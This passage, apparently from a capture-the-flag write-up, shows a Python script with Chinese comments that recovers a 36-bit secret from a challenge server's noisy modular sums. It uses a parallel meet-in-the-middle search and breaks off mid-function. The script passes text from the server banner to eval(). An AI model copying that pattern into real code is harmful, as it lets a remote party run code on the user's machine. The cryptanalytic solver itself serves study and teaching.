class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># parallel_find_secret.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, Event, Queue, cpu_count</span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------- 配置（按需修改）-------------</span></span><br><span class="line"></span><br><span class="line">P = <span class="number">257</span></span><br><span class="line"></span><br><span class="line">N = <span class="number">36</span></span><br><span class="line"></span><br><span class="line">M = <span class="number">50</span></span><br><span class="line"></span><br><span class="line">LEFT_BITS = <span class="number">18</span></span><br><span class="line"></span><br><span class="line">RIGHT_BITS = <span class="number">18</span></span><br><span class="line"></span><br><span class="line">LEFT_SIZE = <span class="number">1</span> &lt;&lt; LEFT_BITS</span><br><span class="line"></span><br><span class="line">RIGHT_SIZE = <span class="number">1</span> &lt;&lt; RIGHT_BITS</span><br><span class="line"></span><br><span class="line">TIME_INDICES = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>]  <span class="comment"># 使用哪些 time 行（保持与服务器一致）</span></span><br><span class="line"></span><br><span class="line">RADIUS = <span class="number">3</span>         <span class="comment"># near 容差 ±3</span></span><br><span class="line"></span><br><span class="line">K_CHECK = <span class="number">6</span>         <span class="comment"># 先用前 K_CHECK 个 time 做快速校验（0 表示禁用快速校验）</span></span><br><span class="line"></span><br><span class="line">SEED = <span class="number">1337</span>         <span class="comment"># 生成 A 的随机种子（必须跟服务器一致）</span></span><br><span class="line"></span><br><span class="line">PROCESSES = <span class="built_in">max</span>(<span class="number">1</span>, cpu_count() - <span class="number">0</span>) <span class="comment"># 启动进程数（可改为具体数字）</span></span><br><span class="line"></span><br><span class="line">PRINT_PROGRESS_EVERY = <span class="number">65536</span>     <span class="comment"># 每多少 r 打印一次进度（单进程内）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_B_list_from_banner</span>(<span class="params">banner_str</span>):</span><br><span class="line"></span><br><span class="line">  m = re.search(<span class="string">r&#x27;give you B: (\[.*?\])&#x27;</span>, banner_str, re.S)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> m:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">    B_list = <span class="built_in">eval</span>(m.group(<span class="number">1</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> B_list</span><br><span class="line"></span><br><span class="line">  <span class="keyword">except</span> Exception:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_problem_from_B</span>(<span class="params">B_list, seed=SEED</span>):</span><br><span class="line"></span><br><span class="line">  random.seed(seed)</span><br><span class="line"></span><br><span class="line">  A = [[[random.randrange(P) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(N)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(M)]</span><br><span class="line"></span><br><span class="line">  C = [<span class="number">0</span>] * M</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(M):</span><br><span class="line"></span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">    </span><br><span class="line">      s = (s + A[t][j][<span class="number">0</span>]) % P</span><br><span class="line">    </span><br><span class="line">    C[t] = s</span><br><span class="line"></span><br><span class="line">  U = [<span class="number">0</span>] * M</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(M):</span><br><span class="line"></span><br><span class="line">    U[t] = (B_list[t] - C[t]) % P</span><br><span class="line"></span><br><span class="line">  D = [[<span class="number">0</span>] * N <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(M)]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(M):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">    </span><br><span class="line">      D[t][j] = (A[t][j][<span class="number">1</span>] - A[t][j][<span class="number">0</span>]) % P</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> A, C, U, D</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">left_map_build</span>(<span class="params">D, time_indices</span>):</span><br><span class="line"></span><br><span class="line">  base = P</span><br><span class="line"></span><br><span class="line">  mapping = defaultdict(<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line">  D_subs = []</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> t <span class="keyword">in</span> time_indices:</span><br><span class="line"></span><br><span class="line">    D_subs.append([D[t][j] % P <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(LEFT_BITS)])</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(LEFT_SIZE):</span><br><span class="line"></span><br><span class="line">    key_val = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    mul = <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(time_indices)):</span><br><span class="line">    </span><br><span class="line">      Dj = D_subs[idx]</span><br><span class="line">    </span><br><span class="line">      S_val = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">      ll = l</span><br><span class="line">    </span><br><span class="line">      <span class="comment"># 只遍历 1 位以加速</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">while</span> ll:</span><br><span class="line">    </span><br><span class="line">        lowbit = ll &amp; -ll</span><br><span class="line">    </span><br><span class="line">        bit_index = (lowbit.bit_length() - <span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">        S_val += Dj[bit_index]</span><br><span class="line">    </span><br><span class="line">        ll ^= lowbit</span><br><span class="line">    </span><br><span class="line">      S_val %= base</span><br><span class="line">    </span><br><span class="line">      key_val += S_val * mul</span><br><span class="line">    </span><br><span class="line">      mul *= base</span><br><span class="line">    </span><br><span class="line">    mapping[key_val].append(l)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> mapping</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">precompute_Sr_table</span>(<span class="params">D, time_indices</span>):</span><br><span class="line"></span><br><span class="line">  R = RIGHT_SIZE</span><br><span class="line"></span><br><span class="line">  k = <span class="built_in">len</span>(time_indices)</span><br><span class="line"></span><br><span class="line">  Sr_table = [ [<span class="number">0</span>]*R <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(k) ]</span><br><span class="line"></span><br><span class="line">  D_subs = []</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> t <span class="keyword">in</span> time_indices:</span><br><span class="line"></span><br><span class="line">    D_subs.append([D[t][j + LEFT_BITS] % P <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(RIGHT_BITS)])</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, R):</span><br><span class="line"></span><br><span class="line">    lowbit = r &amp; -r</span><br><span class="line">    </span><br><span class="line">    bit_idx = lowbit.bit_length() - <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    prev = r &amp; (r - <span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">    </span><br><span class="line">      Sr_table[idx][r] = (Sr_table[idx][prev] + D_subs[idx][bit_idx]) % P</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> Sr_table</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">near_values</span>(<span class="params">v, p=P, radius=RADIUS</span>):</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> [ (v + d) % p <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(-radius, radius+<span class="number">1</span>) ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quick_check_candidate</span>(<span class="params">s, A, B_list, check_times, p=P</span>):</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> t <span class="keyword">in</span> check_times:</span><br><span class="line"></span><br><span class="line">    expected_b = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    row = A[t]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">    </span><br><span class="line">      bit = (s &gt;&gt; j) &amp; <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      expected_b += row[j][bit]</span><br><span class="line">    </span><br><span class="line">    expected_b %= p</span><br><span class="line">    </span><br><span class="line">    err = (B_list[t] - expected_b) % p</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> err &gt; RADIUS <span class="keyword">and</span> err &lt; p - RADIUS:</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">full_check_candidate</span>(<span class="params">s, A, B_list, p=P</span>):</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(M):</span><br><span class="line"></span><br><span class="line">    expected_b = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    row = A[t]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">    </span><br><span class="line">      bit = (s &gt;&gt; j) &amp; <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      expected_b += row[j][bit]</span><br><span class="line">    </span><br><span class="line">    expected_b %= p</span><br><span class="line">    </span><br><span class="line">    err = (B_list[t] - expected_b) % p</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> err &gt; RADIUS <span class="keyword">and</span> err &lt; p - RADIUS:</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">worker_proc</span>(<span class="params">proc_id, r_start, r_end, B_list, A, U, D, time_indices, result_queue, stop_event</span>):</span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  每个进程单独构建 left_map 和 Sr_table，然后在 [r_start, r_end) 区间内枚举。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  发现解将把结果放入 result_queue 并 set stop_event。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">    t0 = time.time()</span><br><span class="line">    </span><br><span class="line">    left_map = left_map_build(D, time_indices)</span><br><span class="line">    </span><br><span class="line">    t1 = time.time()</span><br><span class="line">    </span><br><span class="line">    Sr_table = precompute_Sr_table(D, time_indices)</span><br><span class="line">    </span><br><span class="line">    t2 = time.time()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 进度统计</span></span><br><span class="line">    </span><br><span class="line">    processed = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    total = r_end - r_start</span><br><span class="line">    </span><br><span class="line">    k = <span class="built_in">len</span>(time_indices)</span><br><span class="line">    </span><br><span class="line">    check_times_quick = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="built_in">min</span>(K_CHECK, M)))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 预生成 near 偏移迭代器（笛卡儿积部分）</span></span><br><span class="line">    </span><br><span class="line">    near_iters = [<span class="built_in">range</span>(-RADIUS, RADIUS+<span class="number">1</span>)] * k</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 枚举 r</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(r_start, r_end):</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> stop_event.is_set():</span><br><span class="line">    </span><br><span class="line">        <span class="comment"># 其它进程已找到结果，提前退出</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">      processed += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="comment"># 计算每个 time index 的 target</span></span><br><span class="line">    </span><br><span class="line">      Svals_target = []</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">    </span><br><span class="line">        t_index = time_indices[idx]</span><br><span class="line">    </span><br><span class="line">        Sr = Sr_table[idx][r]</span><br><span class="line">    </span><br><span class="line">        Tval = U[t_index]</span><br><span class="line">    </span><br><span class="line">        target = (Tval - Sr) % P</span><br><span class="line">    </span><br><span class="line">        Svals_target.append(target)</span><br><span class="line">    </span><br><span class="line">      <span class="comment"># 对每个组合检查 left_map（组合数 (2R+1)^k，k=3 R=3 =&gt; 343）</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">for</span> deltas <span class="keyword">in</span> product(*near_iters):</span><br><span class="line">    </span><br><span class="line">        key = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">        mul = <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">    </span><br><span class="line">          sval = (Svals_target[idx] + deltas[idx]) % P</span><br><span class="line">    </span><br><span class="line">          key += sval * mul</span><br><span class="line">    </span><br><span class="line">          mul *= P</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> left_map:</span><br><span class="line">    </span><br><span class="line">          <span class="keyword">continue</span></span><br><span class="line">    </span><br><span class="line">        left_candidates = left_map[key]</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> left_candidates:</span><br><span class="line">    </span><br><span class="line">          s_val = l | (r &lt;&lt; LEFT_BITS)</span><br><span class="line">    </span><br><span class="line">          <span class="keyword">if</span> K_CHECK &gt; <span class="number">0</span> <span class="keyword">and</span> <span class="keyword">not</span> quick_check_candidate(s_val, A, B_list, check_times_quick):</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    </span><br><span class="line">          <span class="keyword">if</span> full_check_candidate(s_val, A, B_list):</span><br><span class="line">    </span><br><span class="line">            <span class="comment"># 找到答案，放入队列并设置停止事件</span></span><br><span class="line">    </span><br><span class="line">            result_queue.put((s_val, proc_id, time.time() - t0))</span><br><span class="line">    </span><br><span class="line">            stop_event.<span class="built_in">set</span>()</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">      <span class="comment"># 进度打印（仅本进程打印，避免过多输出）</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> (r - r_start) % PRINT_PROGRESS_EVERY == (PRINT_PROGRESS_EVERY - <span class="number">1</span>):</span><br><span class="line">    </span><br><span class="line">        elapsed = time.time() - t0</span><br><span class="line">    </span><br><span class="line">        rate = processed / elapsed <span class="keyword">if</span> elapsed &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">        remain = (total - processed) / rate <span class="keyword">if</span> rate &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[P<span class="subst">&#123;proc_id&#125;</span>] r <span class="subst">&#123;r&#125;</span>/<span class="subst">&#123;r_end&#125;</span> processed <span class="subst">&#123;processed&#125;</span>/<span class="subst">&#123;total&#125;</span> rate=<span class="subst">&#123;rate:<span class="number">.1</span>f&#125;</span> it/s est_remain=<span class="subst">&#123;remain:<span class="number">.1</span>f&#125;</span>s&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 本进程区间搜索完毕</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 若子进程出错，把错误放回主进程也能帮助 debug</span></span><br><span class="line">    </span><br><span class="line">    result_queue.put((<span class="string">&quot;ERR&quot;</span>, proc_id, <span class="built_in">str</span>(e)))</span><br><span class="line">    </span><br><span class="line">    stop_event.<span class="built_in">set</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_secret_parallel</span>(<span class="params">B_list</span>):</span><br><span class="line"></span><br><span class="line">  A, C, U, D = build_problem_from_B(B_list)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 分片 r 空间</span></span><br><span class="line"></span><br><span class="line">  num_procs = PROCESSES</span><br><span class="line"></span><br><span class="line">  chunk_size = (RIGHT_SIZE + num_procs - <span class="number">1</span>) // num_procs</span><br><span class="line"></span><br><span class="line">  procs = []</span><br><span class="line"></span><br><span class="line">  stop_event = Event()</span><br><span class="line"></span><br><span class="line">  result_queue = Queue(maxsize=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 启动子进程</span></span><br><span class="line"></span><br><span class="line">  <span 